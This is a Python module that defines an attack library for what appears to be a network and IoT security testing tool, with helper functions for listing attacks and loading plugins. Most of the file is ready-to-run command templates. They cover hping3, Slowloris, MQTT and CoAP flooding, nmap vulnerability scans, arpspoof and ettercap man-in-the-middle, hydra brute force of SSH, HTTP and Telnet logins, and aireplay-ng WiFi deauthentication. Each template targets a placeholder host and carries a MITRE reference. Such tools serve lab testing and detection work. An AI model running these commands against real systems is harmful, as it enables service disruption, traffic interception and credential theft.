from modules.attacks.base import AttackDef, AttackResult
from modules.attacks.plugin_loader import load_plugins as _load_plugins

_PLUGIN_ATTACKS: list[AttackDef] | None = None
_PLUGIN_STATUSES = []

ATTACK_LIBRARY: list[AttackDef] = [
    AttackDef(
        name="syn_flood",
        kill_chain="Actions on Objectives",
        subcategory="denial_of_service",
        continuous=True,
        recommended_dur_s=30,
        description="SYN flood",
        mitre_ref="T1498.001",
        tool="hping3",
        category="dos",
        command="hping3 -S --flood -p {port} {target}",
    ),
    AttackDef(
        name="dos_http",
        kill_chain="Actions on Objectives",
        subcategory="denial_of_service",
        continuous=True,
        recommended_dur_s=60,
        description="HTTP Slowloris",
        mitre_ref="T1499.001",
        tool="slowloris",
        category="dos",
        command="slowloris {target} -p {port} -s 200 -v",
        requires_root=False,
    ),
    AttackDef(
        name="udp_flood",
        kill_chain="Actions on Objectives",
        subcategory="denial_of_service",
        continuous=True,
        recommended_dur_s=30,
        description="UDP flood",
        mitre_ref="T1498.001",
        tool="hping3",
        category="dos",
        command="hping3 --udp --flood -p {port} {target}",
    ),
    AttackDef(
        name="icmp_flood",
        kill_chain="Actions on Objectives",
        subcategory="denial_of_service",
        continuous=True,
        recommended_dur_s=30,
        description="ICMP flood (ping of death)",
        mitre_ref="T1498.001",
        tool="hping3",
        category="dos",
        command="hping3 --icmp --flood {target}",
    ),

    AttackDef(
        name="port_scan",
        kill_chain="Reconnaissance",
        subcategory="network_scanning",
        recommended_dur_s=120,
        description="TCP port scan",
        mitre_ref="T1046",
        tool="nmap",
        category="recon",
        command="nmap -sV -T4 -p- {target}",
        requires_root=False,
    ),
    AttackDef(
        name="vuln_scan",
        kill_chain="Reconnaissance",
        subcategory="network_scanning",
        recommended_dur_s=300,
        description="Vulnerability scan",
        mitre_ref="T1595",
        tool="nmap",
        category="recon",
        command=(
            "nmap -sV --script=vuln "
            "--host-timeout={duration}s "
            "--max-rtt-timeout=200ms --max-retries=2 "
            "{target}"
        ),
    ),
    AttackDef(
        name="os_detection",
        kill_chain="Reconnaissance",
        subcategory="network_scanning",
        recommended_dur_s=120,
        description="Operating system detection",
        mitre_ref="T1592",
        tool="nmap",
        category="recon",
        command=(
            "nmap -O -sV "
            "--host-timeout={duration}s "
            "--max-rtt-timeout=200ms --max-retries=2 "
            "{target}"
        ),
    ),

    AttackDef(
        name="arp_spoof",
        kill_chain="Command and Control",
        subcategory="man_in_the_middle",
        continuous=True,
        recommended_dur_s=60,
        description="ARP spoofing",
        mitre_ref="T1557.002",
        tool="arpspoof",
        category="mitm",
        command="arpspoof -i eth0 -t {target} {gateway}",
    ),
    AttackDef(
        name="arp_spoof_ettercap",
        kill_chain="Command and Control",
        subcategory="man_in_the_middle",
        continuous=True,
        recommended_dur_s=60,
        description="MITM with Ettercap",
        mitre_ref="T1557.002",
        tool="ettercap",
        category="mitm",
        command="ettercap -T -q -M arp:remote /{target}// /{gateway}//",
    ),

    AttackDef(
        name="brute_ssh",
        kill_chain="Initial Access",
        subcategory="brute_force",
        recommended_dur_s=120,
        description="SSH brute force",
        mitre_ref="T1110.001",
        tool="hydra",
        category="brute_force",
        command="hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh -t 4 -V",
        requires_root=False,
    ),
    AttackDef(
        name="brute_http",
        kill_chain="Initial Access",
        subcategory="brute_force",
        recommended_dur_s=120,
        description="HTTP login brute force",
        mitre_ref="T1110.001",
        tool="hydra",
        category="brute_force",
        command='hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-get / -t 4 -V',
        requires_root=False,
    ),
    AttackDef(
        name="brute_telnet",
        kill_chain="Initial Access",
        subcategory="brute_force",
        recommended_dur_s=120,
        description="Telnet brute force",
        mitre_ref="T1110.001",
        tool="hydra",
        category="brute_force",
        command="hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} telnet -t 4 -V",
        requires_root=False,
    ),

    AttackDef(
        name="mqtt_flood",
        kill_chain="Actions on Objectives",
        subcategory="denial_of_service",
        continuous=True,
        recommended_dur_s=30,
        description="MQTT flood",
        mitre_ref="T1498",
        tool="mosquitto_pub",
        category="dos",
        command='for i in $(seq 1 10000); do mosquitto_pub -h {target} -t "test/flood" -m "payload_$i" -q 0; done',
        requires_root=False,
    ),
    AttackDef(
        name="tcp_flood",
        kill_chain="Actions on Objectives",
        subcategory="denial_of_service",
        continuous=True,
        recommended_dur_s=30,
        description="TCP flood",
        mitre_ref="T1498.001",
        tool="hping3",
        category="dos",
        command="hping3 --flood -p {port} {target}",
    ),
    AttackDef(
        name="ping_flood",
        kill_chain="Actions on Objectives",
        subcategory="denial_of_service",
        continuous=True,
        recommended_dur_s=30,
        description="Ping flood",
        mitre_ref="T1498.001",
        tool="nping",
        category="dos",
        command="nping --icmp --rate 1000 -c 10000 {target}",
    ),
    AttackDef(
        name="coap_flood",
        kill_chain="Actions on Objectives",
        subcategory="denial_of_service",
        continuous=True,
        recommended_dur_s=30,
        description="CoAP flood",
        mitre_ref="T1498",
        tool="coap-client",
        category="dos",
        command=(
            "COAP=$(command -v coap-client || command -v coap-client-openssl"
            " || command -v coap-client-gnutls || echo coap-client);"
            " for i in $(seq 1 5000); do $COAP -m get coap://{target}/.well-known/core; done"
        ),
        requires_root=False,
    ),
    AttackDef(
        name="deauth_wifi",
        kill_chain="Actions on Objectives",
        subcategory="wireless_disruption",
        continuous=True,
        recommended_dur_s=30,
        description="WiFi deauthentication",
        mitre_ref="T1498",
        tool="aireplay-ng",
        category="dos",
        command="aireplay-ng --deauth 0 -a {gateway} -c {target} wlan0mon",
    ),
]



_ATTACK_MAP: dict[str, AttackDef] = {a.name: a for a in ATTACK_LIBRARY}


"""
Entrada: None
Salida: list[str] — attack names
Descripción: Returns the names of all attacks in the library.
"""
def get_attack_names() -> list[str]:
    return [a.name for a in ATTACK_LIBRARY]


"""
Entrada: name (str)
Salida: AttackDef | None
Descripción: Returns the attack definition for the given name, or None if not found.
"""
def get_attack_class(name: str) -> AttackDef | None:
    return _ATTACK_MAP.get(name)


"""
Entrada: category (str)
Salida: list[AttackDef]
Descripción: Returns all attacks matching the given category.
"""
def get_attacks_by_category(category: str) -> list[AttackDef]:
    return [a for a in ATTACK_LIBRARY if a.category == category]


"""
Entrada: None
Salida: list[str] — sorted categories
Descripción: Returns the sorted unique list of attack categories.
"""
def get_attack_categories() -> list[str]:
    return sorted(set(a.category for a in ATTACK_LIBRARY))


"""
Entrada: None
Salida: list[dict]
Descripción: For overlay display — includes native attacks + plugins.
"""
def get_attack_info_list() -> list[dict]:
    result = [
        {"name": a.name, "description": a.description,
         "mitre_ref": a.mitre_ref, "tool": a.tool, "category": a.category}
        for a in ATTACK_LIBRARY
    ]
    plugins = get_plugin_attacks()
    if plugins:
        for p in plugins:
            result.append({
                "name": p.name, "description": p.description,
                "mitre_ref": p.mitre_ref, "tool": p.tool,
                "category": f"plugin:{p.category}",
            })
    return result

"""
Entrada: auto_install (bool), log_callback (callable | None)
Salida: list[AttackDef] | None
Descripción: Returns plugin-based attacks, loading them on first access.
"""
def get_plugin_attacks(auto_install: bool = True, log_callback=None):
    global _PLUGIN_ATTACKS, _PLUGIN_STATUSES
    if _PLUGIN_ATTACKS is None:
        _PLUGIN_ATTACKS, _PLUGIN_STATUSES = _load_plugins(
            auto_install=auto_install,
            log_callback=log_callback
        )
    return _PLUGIN_ATTACKS

"""
Entrada: None
Salida: list
Descripción: Returns the list of plugin load statuses.
"""
def get_plugin_statuses():
    return _PLUGIN_STATUSES

"""
Entrada: None
Salida: list[AttackDef]
Descripción: Returns native library attacks plus any plugin attacks.
"""
def get_all_attacks() -> list[AttackDef]:
    return ATTACK_LIBRARY + (get_plugin_attacks() or [])
